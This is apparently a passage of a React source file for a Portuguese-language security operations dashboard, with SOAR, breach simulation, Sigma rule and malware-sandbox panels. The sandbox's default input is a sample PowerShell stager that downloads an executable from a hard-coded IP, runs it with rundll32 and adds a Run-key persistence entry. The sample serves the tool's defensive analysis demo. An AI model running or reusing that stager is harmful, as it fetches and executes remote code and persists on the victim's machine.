import React, { useState, useMemo } from 'react';
import {
  Workflow,
  Zap,
  Radio,
  FileCode2,
  Bug,
  KeyRound,
  Layers,
  Globe,
  Ghost,
  Cloud,
  ShieldCheck,
  ShieldAlert,
  Play,
  RotateCcw,
  Download,
  Copy,
  Check,
  AlertTriangle,
  ExternalLink,
  ChevronRight,
  Terminal,
  Activity,
  Server,
  Lock,
  Search,
  Eye,
  FileCheck,
  Flame,
  Clock,
  Code
} from 'lucide-react';
import { ScanReport, ScannedFile } from '../types';
import { DEFAULT_SOAR_PLAYBOOKS, executeSoarPlaybook, exportPlaybookToYaml, SoarPlaybook, SoarExecutionRun } from '../lib/soarEngine';
import { ATOMIC_ATTACK_TESTS, runBreachAttackSimulation, BasSummaryReport } from '../lib/basEngine';
import { SAMPLE_SIGMA_RULES, transpileSigmaRule, SigmaRule } from '../lib/sigmaEngine';
import { analyzeArtifact, ArtifactAnalysisReport } from '../lib/malwareSandboxEngine';
import { DEFAULT_VAULT_SECRETS, DEFAULT_KMS_KEYS, generateEphemeralSecret, generateVaultClientSnippet, VaultSecretItem } from '../lib/secretsVaultEngine';
import { SAMPLE_SUPPLY_CHAIN_PACKAGES, generateSlsaProvenance, generateCosignCommand } from '../lib/supplyChainEngine';
import { DEFAULT_EASM_ASSETS, DiscoveredAsset } from '../lib/easmEngine';
import { SAMPLE_DARK_WEB_BREACHES, extractEmailsFromFiles, CompromisedAccount } from '../lib/darkWebEngine';
import { SAMPLE_CSPM_FINDINGS, CspmFinding } from '../lib/cspmEngine';
import { DEFAULT_TLS_CERTS, generateCsrSnippet, TlsCertificateItem } from '../lib/pkiEngine';

interface ProSecurityToolsViewProps {
  report: ScanReport;
  files: ScannedFile[];
  onNavigateToTab?: (tab: string) => void;
  onLogAudit?: (event: any) => void;
  initialSubTool?: string;
}

export type ProToolId = 
  | 'soar' 
  | 'bas' 
  | 'sigma' 
  | 'sandbox' 
  | 'vault' 
  | 'supplychain' 
  | 'easm' 
  | 'darkweb' 
  | 'cspm' 
  | 'pki';

export const ProSecurityToolsView: React.FC<ProSecurityToolsViewProps> = ({
  report,
  files,
  onNavigateToTab,
  onLogAudit,
  initialSubTool = 'soar'
}) => {
  const [activeTool, setActiveTool] = useState<ProToolId>(initialSubTool as ProToolId);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  // 1. SOAR State
  const [playbooks, setPlaybooks] = useState<SoarPlaybook[]>(DEFAULT_SOAR_PLAYBOOKS);
  const [activePlaybook, setActivePlaybook] = useState<SoarPlaybook>(DEFAULT_SOAR_PLAYBOOKS[0]);
  const [soarExecutionRun, setSoarExecutionRun] = useState<SoarExecutionRun | null>(null);
  const [isExecutingSoar, setIsExecutingSoar] = useState(false);

  // 2. BAS State
  const [basReport, setBasReport] = useState<BasSummaryReport>(() => runBreachAttackSimulation());
  const [isSimulatingBas, setIsSimulatingBas] = useState(false);

  // 3. Sigma State
  const [selectedSigmaRule, setSelectedSigmaRule] = useState<SigmaRule>(SAMPLE_SIGMA_RULES[0]);
  const transpiledQueries = useMemo(() => transpileSigmaRule(selectedSigmaRule), [selectedSigmaRule]);

  // 4. Malware Sandbox State
  const [sandboxFileName, setSandboxFileName] = useState('suspicious_stager.ps1');
  const [sandboxCode, setSandboxCode] = useState(`$wc = New-Object System.Net.WebClient
$url = "http://185.220.101.5/beacon.exe"
$dest = "C:\\Users\\Public\\updater.dll"
$wc.DownloadFile($url, $dest)
Start-Process -FilePath "rundll32.exe" -ArgumentList "$dest,InstallHook"
New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WinUpdate" -Value $dest -PropertyType "String" -Force
`);
  const [artifactReport, setArtifactReport] = useState<ArtifactAnalysisReport>(() => 
    analyzeArtifact('suspicious_stager.ps1', sandboxCode)
  );

  // 5. Secrets Vault State
  const [vaultSecrets, setVaultSecrets] = useState<VaultSecretItem[]>(DEFAULT_VAULT_SECRETS);
  const [newSecretKey, setNewSecretKey] = useState('PROD_API_GATEWAY_TOKEN');
  const [newSecretPath, setNewSecretPath] = useState('secret/data/gateways/external');

  // 6. Supply Chain State
  const [slsaAttestationArtifact, setSlsaAttestationArtifact] = useState('secscan-engine:v2.4.0');

  // 7. EASM State
  const [easmDomain, setEasmDomain] = useState('enterprise-corp.com');
  const [easmAssets] = useState<DiscoveredAsset[]>(DEFAULT_EASM_ASSETS);

  // 8. Dark Web State
  const [darkWebBreaches] = useState<CompromisedAccount[]>(SAMPLE_DARK_WEB_BREACHES);
  const detectedEmailsInRepo = useMemo(() => extractEmailsFromFiles(files), [files]);

  // 9. CSPM State
  const [cspmFindings, setCspmFindings] = useState<CspmFinding[]>(SAMPLE_CSPM_FINDINGS);

  // 10. PKI State
  const [tlsCerts] = useState<TlsCertificateItem[]>(DEFAULT_TLS_CERTS);

  // Trigger SOAR execution
  const handleExecuteSoar = (pb: SoarPlaybook) => {
    setIsExecutingSoar(true);
    setTimeout(() => {
      const run = executeSoarPlaybook(pb, { triggeredBy: 'SecScan SOC Operator' });
      setSoarExecutionRun(run);
      setIsExecutingSoar(false);
      if (onLogAudit) {
        onLogAudit({
          id: `audit-soar-${Date.now()}`,
          timestamp: new Date().toLocaleTimeString(),
          action: `SOAR Playbook "${pb.name}" disparado e executado com sucesso (${run.totalDurationMs}ms).`,
          user: 'SOAR-Automation-Fabric',
          status: 'SUCCESS'
        });
      }
    }, 600);
  };

  // Trigger BAS simulation
  const handleRunBas = () => {
    setIsSimulatingBas(true);
    setTimeout(() => {
      setBasReport(runBreachAttackSimulation());
      setIsSimulatingBas(false);
      if (onLogAudit) {
        onLogAudit({
          id: `audit-bas-${Date.now()}`,
          timestamp: new Date().toLocaleTimeString(),
          action: 'Simulação BAS (Atomic Red Team) executada contra todos os controles defensivos.',
          user: 'Purple-Team-Engine',
          status: 'SUCCESS'
        });
      }
    }, 800);
  };

  const PRO_TOOLS_MENU: { id: ProToolId; name: string; tag: string; icon: any; color: string; desc: string }[] = [
    { id: 'soar', name: 'SOAR Playbooks', tag: 'Orquestração', icon: Workflow, color: '#00FF41', desc: 'Automação de resposta a incidentes e contenção de credenciais' },
    { id: 'bas', name: 'BAS Purple Teaming', tag: 'Simulação MITRE', icon: Zap, color: '#FF3E00', desc: 'Atomic Red Team e validação de cobertura defensiva' },
    { id: 'sigma', name: 'Sigma Rule Engine', tag: 'Multi-SIEM', icon: FileCode2, color: '#00F0FF', desc: 'Transpiler universal para Splunk, Elastic, Sentinel e LogScale' },
    { id: 'sandbox', name: 'Malware Sandbox', tag: 'Detonação', icon: Bug, color: '#FF7A00', desc: 'Análise estática, extração forense e emulação de comportamento' },
    { id: 'vault', name: 'Secrets Vault & KMS', tag: 'Envelope KMS', icon: KeyRound, color: '#EAB308', desc: 'Segredos efêmeros, tokens transitórios e rotação de chaves' },
    { id: 'supplychain', name: 'Supply Chain & SLSA', tag: 'Cosign / Sigstore', icon: Layers, color: '#A855F7', desc: 'SLSA Provenance v1.0, atestados in-toto e integridade' },
    { id: 'easm', name: 'EASM & OSINT Recon', tag: 'Superfície Exposta', icon: Globe, color: '#3B82F6', desc: 'Mapeamento de subdomínios, portas abertas e Shadow IT' },
    { id: 'darkweb', name: 'Dark Web Monitor', tag: 'Stealer Logs', icon: Ghost, color: '#EC4899', desc: 'Vazamentos de credenciais corporativas e dumps de botnets' },
    { id: 'cspm', name: 'Multi-Cloud CSPM', tag: 'AWS / Azure / GCP', icon: Cloud, color: '#10B981', desc: 'Postura de segurança em nuvem e CIS Benchmarks com CLI 1-click' },
    { id: 'pki', name: 'PKI & Cert-Manager', tag: 'TLS 1.3 / Cifras', icon: Lock, color: '#14B8A6', desc: 'Auditoria de certificados SSL/TLS, forward secrecy e CSRs' }
  ];

  return (
    <div className="space-y-6 animate-fadeIn pb-16">
      {/* Top Hero Banner */}
      <div className="bg-[#0D0D0D] border-2 border-[#00FF41]/40 p-6 rounded-none relative overflow-hidden shadow-[0_0_30px_rgba(0,255,65,0.08)]">
        <div className="absolute top-0 right-0 w-96 h-96 bg-[#00FF41]/5 rounded-full blur-3xl pointer-events-none" />
        <div className="relative z-10 flex flex-col md:flex-row md:items-center justify-between gap-6">
          <div>
            <div className="flex items-center gap-3">
              <span className="px-2.5 py-0.5 bg-[#00FF41] text-black font-mono font-black text-xs uppercase tracking-widest">
                PRO CYBER SUITE
              </span>
              <span className="text-xs font-mono text-[#888] uppercase">
                10 FERRAMENTAS PROFISSIONAIS DE CIBERSEGURANÇA INTEGRADAS
              </span>
            </div>
            <h1 className="text-3xl font-black text-white tracking-tight uppercase mt-2 flex items-center gap-3">
              <ShieldAlert className="w-8 h-8 text-[#00FF41]" />
              Enterprise SecOps & Cyber Defense Hub
            </h1>
            <p className="text-sm text-[#AAA] font-mono mt-1 max-w-3xl">
              Plataforma unificada de orquestração SOAR, simulação de violação BAS, regras universais Sigma, detonação em sandbox, cofre de segredos KMS, integridade de cadeia de suprimentos e inteligência externa.
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-3 shrink-0">
            <div className="bg-[#141414] border border-[#222] p-3 text-right">
              <span className="text-[10px] font-mono text-[#666] uppercase block">STATUS DO SISTEMA</span>
              <span className="text-sm font-mono font-bold text-[#00FF41] flex items-center gap-2">
                <span className="w-2 h-2 rounded-full bg-[#00FF41] animate-pulse" />
                10 / 10 MÓDULOS ATIVOS
              </span>
            </div>
          </div>
        </div>

        {/* Horizontal Tool Selector Tabs */}
        <div className="mt-6 pt-4 border-t border-[#222] flex items-center gap-2 overflow-x-auto pb-2 scrollbar-thin">
          {PRO_TOOLS_MENU.map(tool => {
            const Icon = tool.icon;
            const isSelected = activeTool === tool.id;
            return (
              <button
                key={tool.id}
                onClick={() => setActiveTool(tool.id)}
                className={`flex items-center gap-2 px-3.5 py-2 text-xs font-mono font-bold uppercase transition-all whitespace-nowrap cursor-pointer border ${
                  isSelected
                    ? 'bg-[#00FF41] text-black border-[#00FF41] shadow-[0_0_15px_rgba(0,255,65,0.4)]'
                    : 'bg-[#141414] text-[#888] hover:text-white border-[#222] hover:border-[#444]'
                }`}
              >
                <Icon className="w-3.5 h-3.5" />
                <span>{tool.name}</span>
                <span className={`text-[9px] px-1.5 py-0.2 rounded-none ${
                  isSelected ? 'bg-black text-[#00FF41]' : 'bg-[#222] text-[#666]'
                }`}>
                  {tool.tag}
                </span>
              </button>
            );
          })}
        </div>
      </div>

      {/* 1. SOAR & PLAYBOOK BUILDER */}
      {activeTool === 'soar' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Playbooks List */}
            <div className="space-y-4">
              <div className="flex items-center justify-between">
                <h3 className="text-sm font-mono font-bold uppercase text-white flex items-center gap-2">
                  <Workflow className="w-4 h-4 text-[#00FF41]" />
                  Playbooks Automatizados ({playbooks.length})
                </h3>
              </div>

              <div className="space-y-3">
                {playbooks.map(pb => (
                  <div
                    key={pb.id}
                    onClick={() => setActivePlaybook(pb)}
                    className={`p-4 border transition-all cursor-pointer ${
                      activePlaybook.id === pb.id
                        ? 'bg-[#161616] border-[#00FF41] shadow-[0_0_15px_rgba(0,255,65,0.15)]'
                        : 'bg-[#0F0F0F] border-[#222] hover:border-[#444]'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-[10px] font-mono px-2 py-0.5 bg-[#00FF41]/10 text-[#00FF41] border border-[#00FF41]/30 uppercase font-bold">
                        {pb.category}
                      </span>
                      <span className="text-[10px] font-mono text-[#777]">
                        Execuções: {pb.executionCount}
                      </span>
                    </div>
                    <h4 className="text-sm font-bold text-white mb-1">{pb.name}</h4>
                    <p className="text-xs text-[#888] line-clamp-2 mb-3">{pb.description}</p>
                    <div className="flex items-center justify-between text-[11px] font-mono text-[#666] pt-2 border-t border-[#222]">
                      <span>{pb.steps.length} passos de contenção</span>
                      <span>~{pb.averageExecutionTimeMs}ms SLA</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Playbook Pipeline Visualizer & Execution Panel */}
            <div className="lg:col-span-2 space-y-6">
              <div className="bg-[#0F0F0F] border border-[#222] p-6 space-y-6">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-[#222]">
                  <div>
                    <h3 className="text-lg font-black uppercase text-white">{activePlaybook.name}</h3>
                    <p className="text-xs font-mono text-[#888] mt-0.5">{activePlaybook.description}</p>
                  </div>
                  <div className="flex items-center gap-2">
                    {onNavigateToTab && (
                      <button
                        onClick={() => onNavigateToTab('soarbuilder')}
                        className="px-3 py-2 bg-[#00FF41]/10 hover:bg-[#00FF41]/20 border border-[#00FF41]/40 text-[#00FF41] text-xs font-mono font-bold flex items-center gap-1.5 transition-all cursor-pointer"
                        title="Abrir o Construtor Visual com nós editáveis e drag-and-drop"
                      >
                        <Workflow className="w-3.5 h-3.5 text-[#00FF41]" />
                        <span>Visual Studio</span>
                      </button>
                    )}
                    <button
                      onClick={() => copyToClipboard(exportPlaybookToYaml(activePlaybook), 'soar-yaml')}
                      className="px-3 py-2 bg-[#1A1A1A] hover:bg-[#252525] border border-[#333] text-white text-xs font-mono font-bold flex items-center gap-1.5 transition-all"
                    >
                      {copiedKey === 'soar-yaml' ? <Check className="w-3.5 h-3.5 text-[#00FF41]" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>YAML</span>
                    </button>
                    <button
                      onClick={() => handleExecuteSoar(activePlaybook)}
                      disabled={isExecutingSoar}
                      className="px-4 py-2 bg-[#00FF41] hover:bg-[#00D636] text-black text-xs font-mono font-black uppercase flex items-center gap-2 transition-all cursor-pointer shadow-[0_0_15px_rgba(0,255,65,0.3)] disabled:opacity-50"
                    >
                      {isExecutingSoar ? <Activity className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5 fill-black" />}
                      <span>{isExecutingSoar ? 'Executando Orquestração...' : 'Disparar Playbook'}</span>
                    </button>
                  </div>
                </div>

                {/* Steps Flow Diagram */}
                <div className="space-y-4">
                  <span className="text-xs font-mono text-[#777] uppercase tracking-wider block">
                    Fluxo Lógico de Execução (Trigger &rarr; Condition &rarr; Actions)
                  </span>
                  <div className="space-y-3">
                    {activePlaybook.steps.map((step, idx) => (
                      <div key={step.id} className="relative flex items-start gap-4">
                        <div className="w-7 h-7 bg-[#1A1A1A] border border-[#333] flex items-center justify-center text-xs font-mono font-bold text-white shrink-0 mt-1">
                          {idx + 1}
                        </div>
                        <div className="flex-1 bg-[#141414] border border-[#222] p-4">
                          <div className="flex items-center justify-between mb-1.5">
                            <span className={`text-[10px] font-mono px-2 py-0.5 uppercase font-bold ${
                              step.type === 'TRIGGER' ? 'bg-blue-500/20 text-blue-400 border border-blue-500/30' :
                              step.type === 'CONDITION' ? 'bg-yellow-500/20 text-yellow-400 border border-yellow-500/30' :
                              'bg-[#00FF41]/20 text-[#00FF41] border border-[#00FF41]/30'
                            }`}>
                              {step.type} - {step.targetService}
                            </span>
                            {step.actionType && (
                              <span className="text-[10px] font-mono text-[#888]">{step.actionType}</span>
                            )}
                          </div>
                          <h5 className="text-sm font-bold text-white mb-1">{step.name}</h5>
                          {step.conditionExpr && (
                            <code className="block bg-black p-2 text-xs font-mono text-yellow-300 mb-2 border border-[#222]">
                              if: {step.conditionExpr}
                            </code>
                          )}
                          <pre className="text-[11px] font-mono text-[#777] bg-[#0A0A0A] p-2 overflow-x-auto border border-[#1A1A1A]">
                            config: {JSON.stringify(step.config, null, 2)}
                          </pre>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Live Execution Output Trace */}
                {soarExecutionRun && (
                  <div className="mt-6 pt-6 border-t border-[#222] space-y-4 animate-fadeIn">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-bold text-[#00FF41] uppercase flex items-center gap-2">
                        <Check className="w-4 h-4 text-[#00FF41]" />
                        Trilha Forense da Execução ({soarExecutionRun.totalDurationMs}ms total)
                      </span>
                      <span className="text-[10px] font-mono text-[#666]">{soarExecutionRun.completedAt}</span>
                    </div>

                    <div className="bg-black border border-[#222] p-4 font-mono text-xs space-y-2">
                      {soarExecutionRun.stepResults.map(res => (
                        <div key={res.stepId} className="flex items-start gap-3 border-b border-[#1A1A1A] pb-2 last:border-b-0">
                          <span className="text-[#00FF41] shrink-0 font-bold">[OK - {res.durationMs}ms]</span>
                          <div>
                            <span className="text-white font-bold">{res.stepName}: </span>
                            <span className="text-[#AAA]">{res.message}</span>
                            {res.actionResultPayload && (
                              <div className="text-[10px] text-[#555] mt-0.5">
                                payload: {JSON.stringify(res.actionResultPayload)}
                              </div>
                            )}
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* 2. BAS & PURPLE TEAMING */}
      {activeTool === 'bas' && (
        <div className="space-y-6">
          <div className="bg-[#0F0F0F] border border-[#222] p-6 flex flex-col md:flex-row md:items-center justify-between gap-6">
            <div>
              <div className="flex items-center gap-2 mb-1">
                <span className="text-xs font-mono text-[#FF3E00] uppercase font-bold">BREACH AND ATTACK SIMULATION (BAS)</span>
                <span className="text-[10px] font-mono bg-[#FF3E00]/10 text-[#FF3E00] px-2 py-0.5 border border-[#FF3E00]/30 font-bold">ATOMIC RED TEAM</span>
              </div>
              <h3 className="text-2xl font-black uppercase text-white">Validação Contínua de Defesas MITRE ATT&CK</h3>
              <p className="text-xs font-mono text-[#888] mt-1 max-w-2xl">
                Executa simulações atômicas de adversários contra o EDR, NGFW, WAF e SAST do SecScan para mensurar a taxa real de bloqueio e lacunas de detecção (Defense Gaps).
              </p>
            </div>

            <div className="flex items-center gap-4">
              <div className="text-center px-4 py-2 bg-black border border-[#222]">
                <span className="text-[10px] font-mono text-[#666] block uppercase">Taxa de Cobertura</span>
                <span className="text-2xl font-mono font-black text-[#00FF41]">{basReport.defenseCoverageScore}%</span>
              </div>
              <button
                onClick={handleRunBas}
                disabled={isSimulatingBas}
                className="px-5 py-3 bg-[#FF3E00] hover:bg-[#E03500] text-white text-xs font-mono font-black uppercase flex items-center gap-2 transition-all cursor-pointer shadow-[0_0_20px_rgba(255,62,0,0.3)] disabled:opacity-50"
              >
                {isSimulatingBas ? <Activity className="w-4 h-4 animate-spin" /> : <Play className="w-4 h-4 fill-white" />}
                <span>{isSimulatingBas ? 'Detonando Ataques...' : 'Disparar Simulação BAS'}</span>
              </button>
            </div>
          </div>

          {/* MITRE ATT&CK Atomic Tests Table */}
          <div className="bg-[#0F0F0F] border border-[#222] p-6 space-y-4">
            <h4 className="text-sm font-mono font-bold uppercase text-white flex items-center gap-2">
              <Terminal className="w-4 h-4 text-[#FF3E00]" />
              Resultados dos Testes Atômicos por Tática
            </h4>

            <div className="overflow-x-auto">
              <table className="w-full text-left font-mono text-xs">
                <thead>
                  <tr className="border-b border-[#222] text-[#666] uppercase text-[10px]">
                    <th className="py-2.5 px-3">Técnica MITRE</th>
                    <th className="py-2.5 px-3">Teste Atômico</th>
                    <th className="py-2.5 px-3">Controle Testado</th>
                    <th className="py-2.5 px-3">Resultado</th>
                    <th className="py-2.5 px-3">Tempo Resposta</th>
                    <th className="py-2.5 px-3">Evidência / Remediação</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-[#181818]">
                  {basReport.results.map(res => (
                    <tr key={res.testId} className="hover:bg-[#141414] transition-all">
                      <td className="py-3 px-3">
                        <span className="text-[#FF3E00] font-bold">{res.mitreTechniqueId}</span>
                        <div className="text-[10px] text-[#666]">{res.mitreTactic}</div>
                      </td>
                      <td className="py-3 px-3 font-bold text-white max-w-xs">{res.testName}</td>
                      <td className="py-3 px-3">
                        <span className="px-2 py-0.5 bg-[#1A1A1A] border border-[#333] text-[#AAA] text-[10px] font-bold">
                          {res.testedControl}
                        </span>
                      </td>
                      <td className="py-3 px-3">
                        <span className={`px-2 py-0.5 text-[10px] font-bold uppercase ${
                          res.defenseStatus === 'BLOCKED' ? 'bg-[#00FF41]/20 text-[#00FF41] border border-[#00FF41]/40' :
                          res.defenseStatus === 'DETECTED' ? 'bg-yellow-500/20 text-yellow-400 border border-yellow-500/40' :
                          'bg-[#FF3E00]/20 text-[#FF3E00] border border-[#FF3E00]/40 animate-pulse'
                        }`}>
                          {res.defenseStatus}
                        </span>
                      </td>
                      <td className="py-3 px-3 text-[#888]">{res.detectionTimeMs}ms</td>
                      <td className="py-3 px-3 max-w-sm">
                        <div className="text-[#DDD] text-[11px] mb-1">{res.evidenceLog}</div>
                        <div className="text-[10px] text-[#FF7A00]">&rarr; {res.remediationRecommendation}</div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}

      {/* 3. SIGMA RULE ENGINE & SIEM TRANSPILER */}
      {activeTool === 'sigma' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Rules Selector */}
            <div className="space-y-4">
              <h3 className="text-sm font-mono font-bold uppercase text-white flex items-center gap-2">
                <FileCode2 className="w-4 h-4 text-[#00F0FF]" />
                Regras Sigma Disponíveis ({SAMPLE_SIGMA_RULES.length})
              </h3>
              <div className="space-y-3">
                {SAMPLE_SIGMA_RULES.map(rule => (
                  <div
                    key={rule.id}
                    onClick={() => setSelectedSigmaRule(rule)}
                    className={`p-4 border transition-all cursor-pointer ${
                      selectedSigmaRule.id === rule.id
                        ? 'bg-[#161616] border-[#00F0FF] shadow-[0_0_15px_rgba(0,240,255,0.15)]'
                        : 'bg-[#0F0F0F] border-[#222] hover:border-[#444]'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-1.5">
                      <span className="text-[10px] font-mono px-2 py-0.5 bg-[#00F0FF]/10 text-[#00F0FF] border border-[#00F0FF]/30 font-bold uppercase">
                        {rule.level}
                      </span>
                      <span className="text-[10px] font-mono text-[#666]">{rule.status}</span>
                    </div>
                    <h4 className="text-sm font-bold text-white mb-1">{rule.title}</h4>
                    <p className="text-xs text-[#888] line-clamp-2">{rule.description}</p>
                  </div>
                ))}
              </div>
            </div>

            {/* Transpiler Outputs */}
            <div className="lg:col-span-2 space-y-4">
              <div className="bg-[#0F0F0F] border border-[#222] p-6 space-y-6">
                <div className="flex items-center justify-between pb-4 border-b border-[#222]">
                  <div>
                    <h3 className="text-lg font-black uppercase text-white">{selectedSigmaRule.title}</h3>
                    <p className="text-xs font-mono text-[#888]">{selectedSigmaRule.description}</p>
                  </div>
                  <button
                    onClick={() => copyToClipboard(selectedSigmaRule.rawYaml, 'raw-sigma')}
                    className="px-3 py-1.5 bg-[#1A1A1A] hover:bg-[#252525] border border-[#333] text-white text-xs font-mono font-bold flex items-center gap-1.5"
                  >
                    {copiedKey === 'raw-sigma' ? <Check className="w-3.5 h-3.5 text-[#00FF41]" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>Copiar Sigma YAML</span>
                  </button>
                </div>

                {/* SIEM Transpiled Queries */}
                <div className="space-y-4">
                  <span className="text-xs font-mono text-[#00F0FF] uppercase tracking-wider block font-bold">
                    Tradução Universal para SIEMs e EDRs de Produção:
                  </span>

                  {/* Splunk */}
                  <div className="bg-black border border-[#222] p-4">
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-xs font-mono font-bold text-[#FF7A00]">Splunk SPL</span>
                      <button
                        onClick={() => copyToClipboard(transpiledQueries.splunkSpl, 'splunk')}
                        className="text-[10px] font-mono text-[#777] hover:text-white flex items-center gap-1"
                      >
                        {copiedKey === 'splunk' ? <Check className="w-3 h-3 text-[#00FF41]" /> : <Copy className="w-3 h-3" />}
                        Copiar
                      </button>
                    </div>
                    <code className="text-xs font-mono text-white block overflow-x-auto whitespace-pre">
                      {transpiledQueries.splunkSpl}
                    </code>
                  </div>

                  {/* Elastic KQL */}
                  <div className="bg-black border border-[#222] p-4">
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-xs font-mono font-bold text-[#00FF41]">Elasticsearch (KQL / Lucene)</span>
                      <button
                        onClick={() => copyToClipboard(transpiledQueries.elasticKql, 'elastic')}
                        className="text-[10px] font-mono text-[#777] hover:text-white flex items-center gap-1"
                      >
                        {copiedKey === 'elastic' ? <Check className="w-3 h-3 text-[#00FF41]" /> : <Copy className="w-3 h-3" />}
                        Copiar
                      </button>
                    </div>
                    <code className="text-xs font-mono text-white block overflow-x-auto whitespace-pre">
                      {transpiledQueries.elasticKql}
                    </code>
                  </div>

                  {/* Microsoft Sentinel */}
                  <div className="bg-black border border-[#222] p-4">
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-xs font-mono font-bold text-[#3B82F6]">Microsoft Sentinel (KQL)</span>
                      <button
                        onClick={() => copyToClipboard(transpiledQueries.microsoftSentinelKql, 'sentinel')}
                        className="text-[10px] font-mono text-[#777] hover:text-white flex items-center gap-1"
                      >
                        {copiedKey === 'sentinel' ? <Check className="w-3 h-3 text-[#00FF41]" /> : <Copy className="w-3 h-3" />}
                        Copiar
                      </button>
                    </div>
                    <code className="text-xs font-mono text-white block overflow-x-auto whitespace-pre">
                      {transpiledQueries.microsoftSentinelKql}
                    </code>
                  </div>

                  {/* CrowdStrike LogScale */}
                  <div className="bg-black border border-[#222] p-4">
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-xs font-mono font-bold text-[#EC4899]">CrowdStrike Falcon LogScale (CQL)</span>
                      <button
                        onClick={() => copyToClipboard(transpiledQueries.crowdstrikeLogscale, 'crowdstrike')}
                        className="text-[10px] font-mono text-[#777] hover:text-white flex items-center gap-1"
                      >
                        {copiedKey === 'crowdstrike' ? <Check className="w-3 h-3 text-[#00FF41]" /> : <Copy className="w-3 h-3" />}
                        Copiar
                      </button>
                    </div>
                    <code className="text-xs font-mono text-white block overflow-x-auto whitespace-pre">
                      {transpiledQueries.crowdstrikeLogscale}
                    </code>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* 4. MALWARE SANDBOX */}
      {activeTool === 'sandbox' && (
        <div className="space-y-6">
          <div className="bg-[#0F0F0F] border border-[#222] p-6 space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-[#222]">
              <div>
                <h3 className="text-xl font-black uppercase text-white flex items-center gap-2">
                  <Bug className="w-5 h-5 text-[#FF7A00]" />
                  Detonação Dinâmica & Análise Forense de Malware
                </h3>
                <p className="text-xs font-mono text-[#888] mt-0.5">
                  Isolamento em contêiner descartável, cálculo de entropia de Shannon e traçado de árvore de processos.
                </p>
              </div>

              <button
                onClick={() => setArtifactReport(analyzeArtifact(sandboxFileName, sandboxCode))}
                className="px-4 py-2 bg-[#FF7A00] hover:bg-[#E06B00] text-black text-xs font-mono font-black uppercase flex items-center gap-2 transition-all cursor-pointer shadow-[0_0_15px_rgba(255,122,0,0.3)]"
              >
                <Play className="w-3.5 h-3.5 fill-black" />
                <span>Detonar no Sandbox</span>
              </button>
            </div>

            {/* Input payload & Metadata */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-2">
                <span className="text-xs font-mono text-[#888] uppercase">Script / Payload para Detonação:</span>
                <textarea
                  value={sandboxCode}
                  onChange={(e) => setSandboxCode(e.target.value)}
                  rows={8}
                  className="w-full bg-black border border-[#333] text-white p-3 font-mono text-xs resize-none focus:outline-none focus:border-[#FF7A00]"
                />
              </div>

              {/* Hashes & Entropy */}
              <div className="bg-black border border-[#222] p-4 space-y-3 font-mono text-xs">
                <div className="flex items-center justify-between pb-2 border-b border-[#222]">
                  <span className="text-[#888]">VEREDITO DO SANDBOX:</span>
                  <span className={`px-2 py-0.5 font-bold uppercase ${
                    artifactReport.verdict === 'MALICIOUS' ? 'bg-[#FF3E00]/20 text-[#FF3E00] border border-[#FF3E00]/40' :
                    'bg-yellow-500/20 text-yellow-400 border border-yellow-500/40'
                  }`}>
                    {artifactReport.verdict} (Score: {artifactReport.threatScore}/100)
                  </span>
                </div>
                <div><span className="text-[#666]">SHA-256: </span><span className="text-[#AAA] break-all">{artifactReport.hashes.sha256}</span></div>
                <div><span className="text-[#666]">MD5: </span><span className="text-[#AAA]">{artifactReport.hashes.md5}</span></div>
                <div><span className="text-[#666]">SSDEEP: </span><span className="text-[#AAA]">{artifactReport.hashes.ssdeep}</span></div>
                <div><span className="text-[#666]">Entropia Shannon: </span><span className="text-yellow-400">{artifactReport.shannonEntropy} bits (Alta Ofuscação)</span></div>
              </div>
            </div>

            {/* Process Tree & Behavioral Events */}
            <div className="space-y-4 pt-4 border-t border-[#222]">
              <span className="text-xs font-mono text-[#FF7A00] uppercase font-bold block">
                Comportamento Dinâmico Observado (Process Tree & Network C2):
              </span>

              <div className="bg-black border border-[#222] p-4 font-mono text-xs space-y-4">
                <div>
                  <span className="text-[#666] block mb-2">&bull; Árvore de Processos Gerada:</span>
                  <div className="pl-4 border-l-2 border-[#FF7A00] space-y-2">
                    {artifactReport.simulatedExecution.processTree.map(p => (
                      <div key={p.pid} className="space-y-1">
                        <div className="text-[#FF7A00] font-bold">PID {p.pid} - {p.commandLine}</div>
                        {p.children?.map(c => (
                          <div key={c.pid} className="pl-4 text-[#AAA] text-[11px]">
                            &rarr; PID {c.pid} [{c.processName}] : {c.commandLine}
                          </div>
                        ))}
                      </div>
                    ))}
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2 border-t border-[#1A1A1A]">
                  <div>
                    <span className="text-[#666] block mb-1">&bull; Arquivos Criados no Disco:</span>
                    {artifactReport.simulatedExecution.droppedFiles.map((df, i) => (
                      <div key={i} className="text-[#FF3E00] text-[11px]">&bull; {df}</div>
                    ))}
                  </div>
                  <div>
